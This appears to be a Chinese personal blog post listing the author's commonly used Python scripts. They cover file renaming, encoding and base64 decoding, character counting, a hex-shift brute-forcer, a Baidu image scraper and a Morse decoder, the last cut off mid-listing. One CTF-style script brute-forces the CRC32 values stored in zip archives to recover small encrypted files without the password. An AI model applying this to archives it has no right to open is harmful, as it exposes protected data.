<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    
    
    <title>一些我常用的py脚本 | 远花火 | あなたが大好きです</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="python">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
<link rel="alternate" href="/atom.xml" title="远花火" type="application/atom+xml">
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="">
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Damya</h5>
          <a href="mailto:397526596@qq.com" title="397526596@qq.com" class="mail">
            
              <span>3</span>
            
              <span>9</span>
            
              <span>7</span>
            
              <span>5</span>
            
              <span>2</span>
            
              <span>6</span>
            
              <span>5</span>
            
              <span>9</span>
            
              <span>6</span>
            
              <span>@</span>
            
              <span>q</span>
            
              <span>q</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://github.com/DamyaHome" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                CATEGORIES
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                TAGS
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="">
              <a href="/custom"  >
                <i class="icon icon-lg icon-plus-square"></i>
                CUSTOM
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>一些我常用的py脚本</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">一些我常用的py脚本</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-06-11T13:30:21.000Z" itemprop="datePublished" class="page-time">
  2019-06-11
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/脚本/">脚本</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-一些我常用的py脚本"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">一些我常用的py脚本</h1>
        <div class="post-meta">
            <time class="post-time" title="2019-06-11 21:30:21" datetime="2019-06-11T13:30:21.000Z"  itemprop="datePublished">2019-06-11</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/脚本/">脚本</a></li></ul>



            

            


            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <h2 id="批处理修改文件后缀名-当前目录下"><a href="#批处理修改文件后缀名-当前目录下" class="headerlink" title="批处理修改文件后缀名(当前目录下)"></a>批处理修改文件后缀名(当前目录下)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##python批量更换后缀名</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 列出当前目录下所有的文件</span></span><br><span class="line">files = os.listdir(<span class="string">'.'</span>)</span><br><span class="line"><span class="comment">#print('files',files)</span></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> files:</span><br><span class="line">  portion = os.path.splitext(filename)</span><br><span class="line">  <span class="comment"># 如果后缀是.dat</span></span><br><span class="line">  <span class="keyword">if</span> portion[<span class="number">1</span>] == <span class="string">".filename"</span>: </span><br><span class="line">    <span class="comment"># 重新组合文件名和后缀名</span></span><br><span class="line">    newname = portion[<span class="number">0</span>] + <span class="string">".newname"</span> </span><br><span class="line">    os.rename(filename,newname)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="进制转换解码脚本"><a href="#进制转换解码脚本" class="headerlink" title="进制转换解码脚本"></a>进制转换解码脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> chardet</span><br><span class="line"></span><br><span class="line">a = <span class="string">b"\345\260\274\345\217\244\346\213\211\346\226\257\350\265\265\345\233\233"</span></span><br><span class="line"><span class="comment">#判断当前字符串的格式（编码类型）</span></span><br><span class="line">fencoding = chardet.detect(a)  </span><br><span class="line"></span><br><span class="line">print(fencoding)</span><br><span class="line"><span class="comment">#编码类型为打印出来的fencoding编码类型</span></span><br><span class="line">a = a.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="ascil码转字符串或解base64"><a href="#ascil码转字符串或解base64" class="headerlink" title="ascil码转字符串或解base64"></a>ascil码转字符串或解base64</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ascil码转字符串或解base64</span></span><br><span class="line"><span class="comment"># import base64</span></span><br><span class="line">a=<span class="string">'102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125'</span></span><br><span class="line">a=a.split(<span class="string">' '</span>)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag=flag+chr(int(i))</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># print flag.decode('base64')</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="完整base64解码-txt输入输出"><a href="#完整base64解码-txt输入输出" class="headerlink" title="完整base64解码(txt输入输出)"></a>完整base64解码(txt输入输出)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">'out.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">f1 = open(<span class="string">'out1.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">f1.write(str(base64.b64decode(f.read())))</span><br><span class="line">f.close()</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="批量crc32碰撞"><a href="#批量crc32碰撞" class="headerlink" title="批量crc32碰撞"></a>批量crc32碰撞</h2><p>注释:解压后是68个压缩包,拖进winhex分析,不是伪加密,hint提示是base64,每个文件是4b,所以每个bata.txt应该是4个字符,写脚本进行批量crc32碰撞<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> dic:</span><br><span class="line">                    s = a + b + c + d</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        <span class="comment">#print(s)</span></span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">'out'</span> + str(i) + <span class="string">'.zip'</span></span><br><span class="line">        f = zipfile.ZipFile(file,<span class="string">'r'</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">'+/='</span></span><br><span class="line"><span class="comment">#dic = string.printable</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'out.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="批量图片爬取-百度"><a href="#批量图片爬取-百度" class="headerlink" title="批量图片爬取(百度)"></a>批量图片爬取(百度)</h2><p>需要不同人的需要在脚本目录下新建一个包含关键词的txt<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> error</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">numPicture = <span class="number">0</span></span><br><span class="line">file = <span class="string">''</span></span><br><span class="line">List = []</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> List</span><br><span class="line">    print(<span class="string">'正在检测图片总数，请稍等.....'</span>)</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> t &lt; <span class="number">1000</span>:</span><br><span class="line">        Url = url + str(t)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            Result = requests.get(Url, timeout=<span class="number">7</span>)</span><br><span class="line">        <span class="keyword">except</span> BaseException:</span><br><span class="line">            t = t + <span class="number">60</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = Result.text</span><br><span class="line">            pic_url = re.findall(<span class="string">'"objURL":"(.*?)",'</span>, result, re.S)  <span class="comment"># 先利用正则表达式找到图片url</span></span><br><span class="line">            s += len(pic_url)</span><br><span class="line">            <span class="keyword">if</span> len(pic_url) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                List.append(pic_url)</span><br><span class="line">                t = t + <span class="number">60</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recommend</span><span class="params">(url)</span>:</span></span><br><span class="line">    Re = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        html = requests.get(url)</span><br><span class="line">    <span class="keyword">except</span> error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html.encoding = <span class="string">'utf-8'</span></span><br><span class="line">        bsObj = BeautifulSoup(html.text, <span class="string">'html.parser'</span>)</span><br><span class="line">        div = bsObj.find(<span class="string">'div'</span>, id=<span class="string">'topRS'</span>)</span><br><span class="line">        <span class="keyword">if</span> div <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            listA = div.findAll(<span class="string">'a'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> listA:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    Re.append(i.get_text())</span><br><span class="line">        <span class="keyword">return</span> Re</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dowmloadPicture</span><span class="params">(html, keyword)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="comment"># t =0</span></span><br><span class="line">    pic_url = re.findall(<span class="string">'"objURL":"(.*?)",'</span>, html, re.S)  <span class="comment"># 先利用正则表达式找到图片url</span></span><br><span class="line">    print(<span class="string">'找到关键词:'</span> + keyword + <span class="string">'的图片，即将开始下载图片...'</span>)</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> pic_url:</span><br><span class="line">        print(<span class="string">'正在下载第'</span> + str(num + <span class="number">1</span>) + <span class="string">'张图片，图片地址:'</span> + str(each))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> each <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                pic = requests.get(each, timeout=<span class="number">7</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> BaseException:</span><br><span class="line">            print(<span class="string">'错误，当前图片无法下载'</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            string = file + <span class="string">r'\\'</span> + keyword + <span class="string">'_'</span> + str(num) + <span class="string">'.jpg'</span></span><br><span class="line">            fp = open(string, <span class="string">'wb'</span>)</span><br><span class="line">            fp.write(pic.content)</span><br><span class="line">            fp.close()</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> num &gt;= numPicture:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:  <span class="comment"># 主函数入口</span></span><br><span class="line">    word = input(<span class="string">"请输入搜索关键词(可以是人名，地名等): "</span>)</span><br><span class="line">    <span class="comment">#add = 'http://image.baidu.com/search/flip?tn=baiduimage&amp;ie=utf-8&amp;word=%E5%BC%A0%E5%A4%A9%E7%88%B1&amp;pn=120'</span></span><br><span class="line">    url = <span class="string">'http://image.baidu.com/search/flip?tn=baiduimage&amp;ie=utf-8&amp;word='</span> + word + <span class="string">'&amp;pn='</span></span><br><span class="line">    tot = Find(url)</span><br><span class="line">    Recommend = recommend(url)  <span class="comment"># 记录相关推荐</span></span><br><span class="line">    print(<span class="string">'经过检测%s类图片共有%d张'</span> % (word, tot))</span><br><span class="line">    numPicture = int(input(<span class="string">'请输入想要下载的图片数量 '</span>))</span><br><span class="line">    file = input(<span class="string">'请建立一个存储图片的文件夹，输入文件夹名称即可'</span>)</span><br><span class="line">    y = os.path.exists(file)</span><br><span class="line">    <span class="keyword">if</span> y == <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'该文件已存在，请重新输入'</span>)</span><br><span class="line">        file = input(<span class="string">'请建立一个存储图片的文件夹，)输入文件夹名称即可'</span>)</span><br><span class="line">        os.mkdir(file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.mkdir(file)</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    tmp = url</span><br><span class="line">    <span class="keyword">while</span> t &lt; numPicture:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = tmp + str(t)</span><br><span class="line">            result = requests.get(url, timeout=<span class="number">10</span>)</span><br><span class="line">            print(url)</span><br><span class="line">        <span class="keyword">except</span> error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">'网络错误，请调整网络后重试'</span>)</span><br><span class="line">            t = t+<span class="number">60</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dowmloadPicture(result.text, word)</span><br><span class="line">            t = t + <span class="number">60</span></span><br><span class="line"> </span><br><span class="line">    print(<span class="string">'当前搜索结束，感谢使用'</span>)</span><br><span class="line">    print(<span class="string">'猜你喜欢'</span>)</span><br><span class="line">    <span class="keyword">for</span> re <span class="keyword">in</span> Recommend:</span><br><span class="line">        print(re, end=<span class="string">'  '</span>)</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="统计字符频率"><a href="#统计字符频率" class="headerlink" title="统计字符频率"></a>统计字符频率</h2><p>统计一个文件里字符出现的频率<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"file.txt"</span>)</span><br><span class="line">txt = f.read()</span><br><span class="line">c = Counter()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> txt:</span><br><span class="line">    c[i] = c[i]+<span class="number">1</span></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="将十六进制错位转ascil输出"><a href="#将十六进制错位转ascil输出" class="headerlink" title="将十六进制错位转ascil输出"></a>将十六进制错位转ascil输出</h2><p>做题时发现的脚本,存一下说不定以后有用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io  </span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"></span><br><span class="line"><span class="comment">#改变标准输出的默认编码 </span></span><br><span class="line"><span class="comment">#utf-8中文乱码</span></span><br><span class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">s = [<span class="number">0x4c</span>,<span class="number">0xa6</span>,<span class="number">0x49</span>,<span class="number">0x24</span>,<span class="number">0xa5</span>,<span class="number">0x18</span>,<span class="number">0x54</span>,<span class="number">0xa1</span>,</span><br><span class="line"><span class="number">0x8b</span>,<span class="number">0x14</span>,<span class="number">0x80</span>,<span class="number">0xd1</span>,<span class="number">0x49</span>,<span class="number">0x92</span>,<span class="number">0xc4</span>,<span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x45</span>,<span class="number">0x15</span>,<span class="number">0x38</span>,<span class="number">0x62</span>,<span class="number">0x40</span>,<span class="number">0x4d</span>,<span class="number">0x50</span>,<span class="number">0x94</span>,</span><br><span class="line"><span class="number">0x29</span>,<span class="number">0x92</span>,<span class="number">0x84</span>,<span class="number">0x41</span>,<span class="number">0x45</span>,<span class="number">0xc9</span>,<span class="number">0x41</span>,<span class="number">0x35</span>,</span><br><span class="line"><span class="number">0x52</span>,<span class="number">0x5c</span>,<span class="number">0xa6</span>,<span class="number">0x45</span>,<span class="number">0x50</span>,<span class="number">0xa3</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,</span><br><span class="line"><span class="number">0x83</span>,<span class="number">0x13</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">160</span>):</span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(s)):</span><br><span class="line">        flag+=chr(s[j]-i)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="解摩斯密码"><a href="#解摩斯密码" class="headerlink" title="解摩斯密码"></a>解摩斯密码</h2><p>只能输出大写字母,后续再添加功能,更新了所有的符号<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line">a = <span class="string">"-..- ..--- ...- ...- .... -.-. ..-. ----. ----."</span></span><br><span class="line">s = a.split(<span class="string">" "</span>)</span><br><span class="line">dict = &#123;<span class="string">'.-'</span>: <span class="string">'A'</span>,</span><br><span class="line">        <span class="string">'-...'</span>: <span class="string">'B'</span>,</span><br><span class="line">        <span class="string">'-.-.'</span>: <span class="string">'C'</span>,</span><br><span class="line">        <span class="string">'-..'</span>:<span class="string">'D'</span>,</span><br><span class="line">        <span class="string">'.'</span>:<span class="string">'E'</span>,</span><br><span class="line">        <span class="string">'..-.'</span>:<span class="string">'F'</span>,</span><br><span class="line">        <span class="string">'--.'</span>: <span class="string">'G'</span>,</span><br><span class="line">        <span class="string">'....'</span>: <span class="string">'H'</span>,</span><br><span class="line">        <span class="string">'..'</span>: <span class="string">'I'</span>,</span><br><span class="line">        <span class="string">'.---'</span>:<span class="string">'J'</span>,</span><br><span class="line">        <span class="string">'-.-'</span>: <span class="string">'K'</span>,</span><br><span class="line">        <span class="string">'.-..'</span>: <span class="string">'L'</span>,</span><br><span class="line">        <span class="string">'--'</span>: <span class="string">'M'</span>,</span><br><span class="line">        <span class="string">'-.'</span>: <span class="string">'N'</span>,</span><br><span class="line">        <span class="string">'---'</span>: <span class="string">'O'</span>,</span><br><span class="line">        <span class="string">'.--.'</span>: <span class="string">'P'</span>,</span><br><span class="line">        <span class="string">'--.-'</span>: <span class="string">'Q'</span>,</span><br><span class="line">        <span class="string">'.-.'</span>: <span class="string">'R'</span>,</span><br><span class="line">        <span class="string">'...'</span>: <span class="string">'S'</span>,</span><br><span class="line">        <span class="string">'-'</span>: <span class="string">'T'</span>,</span><br><span class="line">        <span class="string">'..-'</span>: <span class="string">'U'</span>,</span><br><span class="line">        <span class="string">'...-'</span>: <span class="string">'V'</span>,</span><br><span class="line">        <span class="string">'.--'</span>: <span class="string">'W'</span>,</span><br><span class="line">        <span class="string">'-..-'</span>: <span class="string">'X'</span>,</span><br><span class="line">        <span class="string">'-.--'</span>: <span class="string">'Y'</span>,</span><br><span class="line">        <span class="string">'--..'</span>: <span class="string">'Z'</span>,</span><br><span class="line">        <span class="string">'.----'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'..---'</span>: <span class="string">'2'</span>,</span><br><span class="line">        <span class="string">'...--'</span>: <span class="string">'3'</span>,</span><br><span class="line">        <span class="string">'....-'</span>: <span class="string">'4'</span>,</span><br><span class="line">        <span class="string">'.....'</span>: <span class="string">'5'</span>,</span><br><span class="line">        <span class="string">'-....'</span>: 